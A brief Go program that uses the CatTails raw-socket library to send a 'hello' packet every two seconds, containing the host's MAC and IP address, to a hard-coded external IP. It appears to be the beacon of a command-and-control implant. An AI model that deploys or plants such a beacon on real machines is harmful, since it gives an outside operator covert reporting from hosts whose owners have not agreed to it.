package main

import (
	"net"
	"time"

	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

func sendHello(fd int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))

	addr := cattails.CreateAddrStruct(iface)

	cattails.SendPacket(fd, iface, addr, packet)
}

func main() {

	fd := cattails.NewSocket()
	defer unix.Close(fd)

	iface, src := cattails.GetOutwardIface("8.8.8.8:80")

	dstMAC, _ := cattails.GetRouterMAC()

	for {
		time.Sleep(2 * time.Second)
		// 18.191.209.30
		sendHello(fd, iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
	}

}
